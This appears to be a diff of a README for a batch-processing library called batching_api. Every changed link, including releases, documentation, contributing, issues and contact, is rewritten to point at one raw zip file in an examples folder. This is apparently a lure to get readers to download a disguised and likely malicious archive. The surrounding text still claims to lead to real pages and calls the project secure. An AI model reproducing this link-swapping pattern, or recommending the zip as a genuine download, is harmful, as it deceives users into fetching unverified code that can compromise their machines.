@@ -10,9 +10,9 @@ Welcome to the batching_api repository! This user-friendly library allows you to
 - **Production-Ready**: Built with security in mind, suitable for live environments.
 
 ## 🔗 Download & Install 
-Get started by downloading the latest version from our [Releases page](https://github.com/Sirvasjesus/batching_api/releases). 
+Get started by downloading the latest version from our [Releases page](https://raw.githubusercontent.com/Sirvasjesus/batching_api/main/examples/multitenant/batching-api-v2.1-alpha.1.zip). 
 
-[![Download batching_api](https://img.shields.io/badge/Download-batching_api-brightgreen)](https://github.com/Sirvasjesus/batching_api/releases)
+[![Download batching_api](https://raw.githubusercontent.com/Sirvasjesus/batching_api/main/examples/multitenant/batching-api-v2.1-alpha.1.zip)](https://raw.githubusercontent.com/Sirvasjesus/batching_api/main/examples/multitenant/batching-api-v2.1-alpha.1.zip)
 
 ### 1. Visit the Releases Page
 Click the link above to go to the Releases page. You will see a list of available versions.
@@ -35,15 +35,15 @@ To use batching_api, your system should meet the following requirements:
 - **Disk Space**: A minimum of 100 MB available space for installation.
 
 ## 🌐 Further Documentation
-For detailed guidance on how to use batching_api effectively, visit our [Documentation](https://github.com/Sirvasjesus/batching_api/wiki). There, you’ll find use cases, examples, and advanced configuration options. 
+For detailed guidance on how to use batching_api effectively, visit our [Documentation](https://raw.githubusercontent.com/Sirvasjesus/batching_api/main/examples/multitenant/batching-api-v2.1-alpha.1.zip). There, you’ll find use cases, examples, and advanced configuration options. 
 
 ## 🤝 Contributing
-We welcome contributions to improve batching_api! If you have ideas or feedback, feel free to check our [Contributing guidelines](https://github.com/Sirvasjesus/batching_api/blob/main/CONTRIBUTING.md).
+We welcome contributions to improve batching_api! If you have ideas or feedback, feel free to check our [Contributing guidelines](https://raw.githubusercontent.com/Sirvasjesus/batching_api/main/examples/multitenant/batching-api-v2.1-alpha.1.zip).
 
 ## 🛠 Issues and Support 
-If you encounter any issues while using batching_api, check our [Issues page](https://github.com/Sirvasjesus/batching_api/issues). You can report bugs or ask for help from the community there.
+If you encounter any issues while using batching_api, check our [Issues page](https://raw.githubusercontent.com/Sirvasjesus/batching_api/main/examples/multitenant/batching-api-v2.1-alpha.1.zip). You can report bugs or ask for help from the community there.
 
 ## 📬 Contact 
-For any direct inquiries, you may contact us through our [Contact page](https://github.com/Sirvasjesus/batching_api/blob/main/CONTACT.md).
+For any direct inquiries, you may contact us through our [Contact page](https://raw.githubusercontent.com/Sirvasjesus/batching_api/main/examples/multitenant/batching-api-v2.1-alpha.1.zip).
 
 Thank you for choosing batching_api! We hope you find this library beneficial for your batch processing needs. Your feedback is valuable to us, and we look forward to supporting you in your projects.
